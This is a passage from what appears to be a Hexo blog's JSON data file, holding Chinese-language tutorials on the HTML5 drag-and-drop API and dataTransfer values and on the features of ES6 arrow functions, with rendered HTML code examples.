&#125;</span></span><br><span class=\"line\"><span class=\"undefined\">        </span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">// 拖拽释放</span></span></span><br><span class=\"line\"><span class=\"javascript\">        tar.ondrop = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// ...</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"传递消息\"><a href=\"#传递消息\" class=\"headerlink\" title=\"传递消息\"></a>传递消息</h3><p>在拖拽的整个周期中，我们都可以通过 <code>dataTransfer</code> 来传递数据。但是数据流通必须在 <code>dropEffect</code> 与 <code>effectAllowed</code> 值相同的情况下才能进行传输。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在开始拖拽的时候设置数据</span></span><br><span class=\"line\">el.ondragstart = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 设置 effectAllowed 为 'move'</span></span><br><span class=\"line\">    e.dataTransfer.effectAllowed = <span class=\"string\">'move'</span>;</span><br><span class=\"line\">    e.dataTransfer.setData(<span class=\"string\">'msg'</span>, <span class=\"built_in\">JSON</span>.stringify(&#123;<span class=\"attr\">name</span>: <span class=\"string\">'Carl'</span>&#125;))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 在拖拽结束的时候清除数据</span></span><br><span class=\"line\">el.ondragend = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">    e.dataTransfer.clearData(<span class=\"string\">'msg'</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 再拖拽释放的时候获取数据</span></span><br><span class=\"line\">tar.ondrop = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 必须设置 dropEffect 为 'move'，否则无法通过 getData 获取数据</span></span><br><span class=\"line\">    e.dataTransfer.dropEffect = <span class=\"string\">'move'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> msg = <span class=\"built_in\">JSON</span>.parse(e.dataTransfer.getData(<span class=\"string\">'msg'</span>));</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(msg.name); <span class=\"comment\">// -&gt; 'Carl'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"常见的-dropEffect-与-effectAllowed-值\"><a href=\"#常见的-dropEffect-与-effectAllowed-值\" class=\"headerlink\" title=\"常见的 dropEffect 与 effectAllowed 值\"></a>常见的 <code>dropEffect</code> 与 <code>effectAllowed</code> 值</h3><p><strong>常见的 <code>dropEffect</code> 的值</strong></p>\n<ul>\n<li>copy：复制到新的位置</li>\n<li>move：移动到新的位置</li>\n<li>link: 建立一个源位置到新位置的链接</li>\n<li>none：禁止任何操作</li>\n</ul>\n<p><strong>常见的 <code>effectAllowed</code> 值</strong></p>\n<ul>\n<li>copy: 复制到新的位置</li>\n<li>move:移动到新的位置</li>\n<li>link:建立一个源位置到新位置的链接</li>\n<li>copyLink: 允许复制或者链接</li>\n<li>copyMove: 允许复制或者移动</li>\n<li>linkMove: 允许链接或者移动</li>\n<li>all: 允许所有的操作</li>\n<li>none: 禁止所有操作</li>\n<li>uninitialized: 缺省值(默认值), 相当于 <code>all</code></li>\n</ul>\n<p>细心的你可能会发现 <code>dropEffect</code> 与 <code>effectAllowed</code> 的值类型上根本不匹配，那么我上面说的 <strong><code>dropEffect</code> 与 <code>effectAllowed</code> 值相同的情况下才能进行传输</strong> 岂不是根本就对应不上了？<br>文档上对此的解释是：<code>dropEffect</code> 与 <code>effectAllowed</code> 的值，<strong>分配任何其他值时不会有任何影响并且保留旧值</strong>。意思就是多次的修改 <code>dropEffect</code> 与 <code>effectAllowed</code> 的值并不会影响之前设置的值，类似于 <code>addEventListener</code> 的用法(关于这点我并没有具体的实验过，感兴趣的可以自己试下)，<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/DataTransfer\" target=\"_blank\" rel=\"noopener\">文档地址</a>。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>说的再多可能都没有自己写一个 <code>demo</code> 理解的快，关于 <code>drag/drop</code> 常用的一些东西已经在上面列出了。<code>dropEffect</code> 对象中还有一些别的方法，不过引用情况并不是特别多，所以这里就不再一一讲解了，感兴趣的可以看下<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/DataTransfer\" target=\"_blank\" rel=\"noopener\">文档</a>。</p>\n","site":{"data":{}},"excerpt":"<p><code>HTML5</code> 为我们提供了 <code>drag/drop</code> 拖拽功能的 <code>api</code>，极大的简化了我们在开发拖拽功能时的代码量。<br>","more":"</p>\n<h3 id=\"API介绍\"><a href=\"#API介绍\" class=\"headerlink\" title=\"API介绍\"></a>API介绍</h3><p>所有的拖拽事件必须作用于可拖拽的元素上(<code>draggable=&#39;true&#39;</code>)，否则将无法触发拖拽事件。</p>\n<p><strong>drag</strong><br>作用于：拖拽元素。<br>说明：当元素或者选择的文本被拖动时触发 <code>drag</code> 事件 (频率：每几百毫秒触发一次)。</p>\n<p><strong>dragstart</strong><br>作用于：拖拽元素。<br>说明：当用户开始拖动一个元素或者一个选择文本的时候 <code>dragstart</code> 事件就会触发(仅触发一次)。</p>\n<p><strong>dragover</strong><br>作用于：目标元素。<br>说明：当元素或者选择的文本被拖拽到一个有效的放置目标上时，触发 <code>dragover</code> 事件(频率：每几百毫秒触发一次)。</p>\n<p><strong>dragenter</strong><br>作用于：目标元素。<br>说明：当元素或者选择的文本被拖拽进入到一个有效的放置目标上时，触发 <code>dragenter</code> 事件(仅触发一次)。</p>\n<p><strong>dragleave</strong><br>作用于：目标元素。<br>说明：当元素或者选择的文本被拖拽离开一个有效的放置目标上时，触发 <code>dragleave</code> 事件(仅触发一次)。</p>\n<p><strong>dragend</strong><br>作用于：拖拽元素。<br>说明：当一个拖拽的操作被取消(弹起鼠标/按下 <code>space</code> 键)时，触发 <code>dragend</code> 事件(仅触发一次)。</p>\n<p><strong>drop</strong><br>作用于：目标元素。<br>说明：当一个元素或是选中的文字被拖拽释放到一个 <code>有效的</code> 释放目标位置时，<code>drop</code> 事件被抛出(仅触发一次)。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">\"viewport\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"width=device-width, initial-scale=1.0\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"X-UA-Compatible\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"ie=edge\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"\"</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">        .drag-box &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">            width: 100px;</span></span><br><span class=\"line\"><span class=\"undefined\">            height: 100px;</span></span><br><span class=\"line\"><span class=\"undefined\">            background-color: lightcoral;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">        .drop-box &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">            width: 500px;</span></span><br><span class=\"line\"><span class=\"undefined\">            height: 500px;</span></span><br><span class=\"line\"><span class=\"undefined\">            background-color: lightblue;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"drag-box\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"drag-box\"</span> <span class=\"attr\">draggable</span>=<span class=\"string\">\"true\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"drop-box\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">var</span> el = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'drag-box'</span>),</span></span><br><span class=\"line\"><span class=\"javascript\">            tar = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'drog-box'</span>);</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">// 元素触发拖拽</span></span></span><br><span class=\"line\"><span class=\"javascript\">        el.ondrag = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// ...</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">// 开始拖拽</span></span></span><br><span class=\"line\"><span class=\"javascript\">        el.ondragstart = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// ...</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">// 拖拽结束</span></span></span><br><span class=\"line\"><span class=\"javascript\">        el.ondragend = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// ...</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">// 拖拽至目标元素上</span></span></span><br><span class=\"line\"><span class=\"javascript\">        tar.ondragover = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"undefined\">            e.preventDefault();</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// ...</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">// 拖拽进入目标元素</span></span></span><br><span class=\"line\"><span class=\"javascript\">        tar.ondragenter = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// ...</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">// 拖拽离开目标元素</span></span></span><br><span class=\"line\"><span class=\"javascript\">        tar.ondragleave = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// ...</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">        </span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">// 拖拽释放</span></span></span><br><span class=\"line\"><span class=\"javascript\">        tar.ondrop = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// ...</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"传递消息\"><a href=\"#传递消息\" class=\"headerlink\" title=\"传递消息\"></a>传递消息</h3><p>在拖拽的整个周期中，我们都可以通过 <code>dataTransfer</code> 来传递数据。但是数据流通必须在 <code>dropEffect</code> 与 <code>effectAllowed</code> 值相同的情况下才能进行传输。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在开始拖拽的时候设置数据</span></span><br><span class=\"line\">el.ondragstart = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 设置 effectAllowed 为 'move'</span></span><br><span class=\"line\">    e.dataTransfer.effectAllowed = <span class=\"string\">'move'</span>;</span><br><span class=\"line\">    e.dataTransfer.setData(<span class=\"string\">'msg'</span>, <span class=\"built_in\">JSON</span>.stringify(&#123;<span class=\"attr\">name</span>: <span class=\"string\">'Carl'</span>&#125;))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 在拖拽结束的时候清除数据</span></span><br><span class=\"line\">el.ondragend = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">    e.dataTransfer.clearData(<span class=\"string\">'msg'</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 再拖拽释放的时候获取数据</span></span><br><span class=\"line\">tar.ondrop = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 必须设置 dropEffect 为 'move'，否则无法通过 getData 获取数据</span></span><br><span class=\"line\">    e.dataTransfer.dropEffect = <span class=\"string\">'move'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> msg = <span class=\"built_in\">JSON</span>.parse(e.dataTransfer.getData(<span class=\"string\">'msg'</span>));</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(msg.name); <span class=\"comment\">// -&gt; 'Carl'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"常见的-dropEffect-与-effectAllowed-值\"><a href=\"#常见的-dropEffect-与-effectAllowed-值\" class=\"headerlink\" title=\"常见的 dropEffect 与 effectAllowed 值\"></a>常见的 <code>dropEffect</code> 与 <code>effectAllowed</code> 值</h3><p><strong>常见的 <code>dropEffect</code> 的值</strong></p>\n<ul>\n<li>copy：复制到新的位置</li>\n<li>move：移动到新的位置</li>\n<li>link: 建立一个源位置到新位置的链接</li>\n<li>none：禁止任何操作</li>\n</ul>\n<p><strong>常见的 <code>effectAllowed</code> 值</strong></p>\n<ul>\n<li>copy: 复制到新的位置</li>\n<li>move:移动到新的位置</li>\n<li>link:建立一个源位置到新位置的链接</li>\n<li>copyLink: 允许复制或者链接</li>\n<li>copyMove: 允许复制或者移动</li>\n<li>linkMove: 允许链接或者移动</li>\n<li>all: 允许所有的操作</li>\n<li>none: 禁止所有操作</li>\n<li>uninitialized: 缺省值(默认值), 相当于 <code>all</code></li>\n</ul>\n<p>细心的你可能会发现 <code>dropEffect</code> 与 <code>effectAllowed</code> 的值类型上根本不匹配，那么我上面说的 <strong><code>dropEffect</code> 与 <code>effectAllowed</code> 值相同的情况下才能进行传输</strong> 岂不是根本就对应不上了？<br>文档上对此的解释是：<code>dropEffect</code> 与 <code>effectAllowed</code> 的值，<strong>分配任何其他值时不会有任何影响并且保留旧值</strong>。意思就是多次的修改 <code>dropEffect</code> 与 <code>effectAllowed</code> 的值并不会影响之前设置的值，类似于 <code>addEventListener</code> 的用法(关于这点我并没有具体的实验过，感兴趣的可以自己试下)，<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/DataTransfer\" target=\"_blank\" rel=\"noopener\">文档地址</a>。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>说的再多可能都没有自己写一个 <code>demo</code> 理解的快，关于 <code>drag/drop</code> 常用的一些东西已经在上面列出了。<code>dropEffect</code> 对象中还有一些别的方法，不过引用情况并不是特别多，所以这里就不再一一讲解了，感兴趣的可以看下<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/DataTransfer\" target=\"_blank\" rel=\"noopener\">文档</a>。</p>"},{"title":"箭头函数","date":"2016-12-03T07:55:59.000Z","_content":"熟悉后端的人对于箭头函数应该不会陌生，在 `C#` 中它叫做 `Lambda表达式`，其他的后端语言中也一直都有他的身影。\n箭头函数是ES6新加入的一个重要特性，它简洁明了的书写方式大大的简化了我们平时代码。下面我们\b看一下箭头函数的特性。\n<!-- more -->\n\n### 箭头函数的特性\n\n* 自动返回\n* 不会绑定自己的 `this`\n* 书写更加方便\n* 不会绑定 `arguments`\n* 无法使用 `prototype`\n* \b无法使用 `new` 关键字\n* 在创建是初始化 `this` 而非调用时指定\n\n\n\n\n### 自动返回\n\n```js\n// 写法一\nvar fn = a => a + 1\n\n// 写法二\nvar fn2 = (a, b) => a + b\n\n// 写法三\nvar fn3 = (a, b) => (a + b)\n\n// 写法四\nvar fn4 = (a, b) => {\n    // do something\n    return a + b\n}\n```\n\n当 `参数` 只有一个的时候，可以省略参数外面的 `()`;\n当函数的表达式只有一句时，可以直接书写在 `=>` 后面，表示返回该表达式；\b也可以在表达式外加上一对 `()`返回，一般用于返回 `字面量` 和 `提升优先级`。\n如果逻辑处理过长，则使用 `写法四` 书写，该写法不会自动返回，需手动指定返回内容。\n\n### 不会绑定自己的 `this`\n\n```js\ndocument.body.onclick = () => console.log(this)\n\n// this => window\n\ndocument.body.onclick = function () {\n    console.log(this)\n}\n\n// this => body\n```\n\n### 不会绑定 `arguments`\n\n```js\n\nvar arguments = 'arguments';\nvar fn = () => console.log(arguments)\n\n// arguments => 'arguments'\n\n```\n\n### 无法使用 `prototype`\n\n```js\nvar fn = () => {\n    console.log('fn')\n}\n\nconsole.log(fn.prototype)\n// fn.prototype => undefined\n// 箭头函数没有 prototype 原型链\n```\n\n### \b无法使用 `new` 关键字\n\n```js\n\nvar fn = () => {\n    console.log('fn')\n}\n\nvar f = new fn()\n\n// Uncaught TypeError: fn is not a constructor\n// 函数 fn 不是一个构造器\n```\n\n\n以上就是箭头函数的所有特性了。\n\n### 在创建是初始化 `this` 而非调用时指定\n\n```js\n// 非箭头函数\nvar obj = {\n    fn: function () {\n        return function () {\n            console.log(this)\n        }\n    }\n}\n\nvar f = obj.fn();\nvar res = f(); // -> window\n\n```\n\n```js\n// 箭头函数\nvar obj = {\n    fn: function () {\n        return () => {\n            console.log(this)\n        }\n    }\n}\n\nvar f = obj.fn();\nvar res = f(); // -> obj\n```","source":"_posts/箭头函数.md","raw":"---\ntitle: 箭头函数\ndate: 2016-12-03 15:55:59\ntags:\n---\n熟悉后端的人对于箭头函数应该不会陌生，在 `C#` 中它叫做 `Lambda表达式`，其他的后端语言中也一直都有他的身影。\n箭头函数是ES6新加入的一个重要特性，它简洁明了的书写方式大大的简化了我们平时代码。下面我们\b看一下箭头函数的特性。\n<!-- more -->\n\n### 箭头函数的特性\n\n* 自动返回\n* 不会绑定自己的 `this`\n* 书写更加方便\n* 不会绑定 `arguments`\n* 无法使用 `prototype`\n* \b无法使用 `new` 关键字\n* 在创建是初始化 `this` 而非调用时指定\n\n\n\n\n### 自动返回\n\n```js\n// 写法一\nvar fn = a => a + 1\n\n// 写法二\nvar fn2 = (a, b) => a + b\n\n// 写法三\nvar fn3 = (a, b) => (a + b)\n\n// 写法四\nvar fn4 = (a, b) => {\n    // do something\n    return a + b\n}\n```\n\n当 `参数` 只有一个的时候，可以省略参数外面的 `()`;\n当函数的表达式只有一句时，可以直接书写在 `=>` 后面，表示返回该表达式；\b也可以在表达式外加上一对 `()`返回，一般用于返回 `字面量` 和 `提升优先级`。\n如果逻辑处理过长，则使用 `写法四` 书写，该写法不会自动返回，需手动指定返回内容。\n\n### 不会绑定自己的 `this`\n\n```js\ndocument.body.onclick = () => console.log(this)\n\n// this => window\n\ndocument.body.onclick = function () {\n    console.log(this)\n}\n\n// this => body\n```\n\n### 不会绑定 `arguments`\n\n```js\n\nvar arguments = 'arguments';\nvar fn = () => console.log(arguments)\n\n// arguments => 'arguments'\n\n```\n\n### 无法使用 `prototype`\n\n```js\nvar fn = () => {\n    console.log('fn')\n}\n\nconsole.log(fn.prototype)\n// fn.prototype => undefined\n// 箭头函数没有 prototype 原型链\n```\n\n### \b无法使用 `new` 关键字\n\n```js\n\nvar fn = () => {\n    console.log('fn')\n}\n\nvar f = new fn()\n\n// Uncaught TypeError: fn is not a constructor\n// 函数 fn 不是一个构造器\n```\n\n\n以上就是箭头函数的所有特性了。\n\n### 在创建是初始化 `this` 而非调用时指定\n\n```js\n// 非箭头函数\nvar obj = {\n    fn: function () {\n        return function () {\n            console.log(this)\n        }\n    }\n}\n\nvar f = obj.fn();\nvar res = f(); // -> window\n\n```\n\n```js\n// 箭头函数\nvar obj = {\n    fn: function () {\n        return () => {\n            console.log(this)\n        }\n    }\n}\n\nvar f = obj.fn();\nvar res = f(); // -> obj\n```","slug":"箭头函数","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qw000j02vsrnr0qtzt","content":"<p>熟悉后端的人对于箭头函数应该不会陌生，在 <code>C#</code> 中它叫做 <code>Lambda表达式</code>，其他的后端语言中也一直都有他的身影。<br>箭头函数是ES6新加入的一个重要特性，它简洁明了的书写方式大大的简化了我们平时代码。下面我们\b看一下箭头函数的特性。<br><a id=\"more\"></a></p>\n<h3 id=\"箭头函数的特性\"><a href=\"#箭头函数的特性\" class=\"headerlink\" title=\"箭头函数的特性\"></a>箭头函数的特性</h3><ul>\n<li>自动返回</li>\n<li>不会绑定自己的 <code>this</code></li>\n<li>书写更加方便</li>\n<li>不会绑定 <code>arguments</code></li>\n<li>无法使用 <code>prototype</code></li>\n<li>\b无法使用 <code>new</code> 关键字</li>\n<li>在创建是初始化 <code>this</code> 而非调用时指定</li>\n</ul>\n<h3 id=\"自动返回\"><a href=\"#自动返回\" class=\"headerlink\" title=\"自动返回\"></a>自动返回</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 写法一</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> fn = <span class=\"function\"><span class=\"params\">a</span> =&gt;</span> a + <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 写法二</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> fn2 = <span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> a + b</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 写法三</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> fn3 = <span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> (a + b)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 写法四</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> fn4 = <span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// do something</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> a + b</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当 <code>参数</code> 只有一个的时候，可以省略参数外面的 <code>()</code>;<br>当函数的表达式只有一句时，可以直接书写在 <code>=&gt;</code> 后面，表示返回该表达式；\b也可以在表达式外加上一对 <code>()</code>返回，一般用于返回 <code>字面量</code> 和 <code>提升优先级</code>。<br>如果逻辑处理过长，则使用 <code>写法四</code> 书写，该写法不会自动返回，需手动指定返回内容。</p>\n<h3 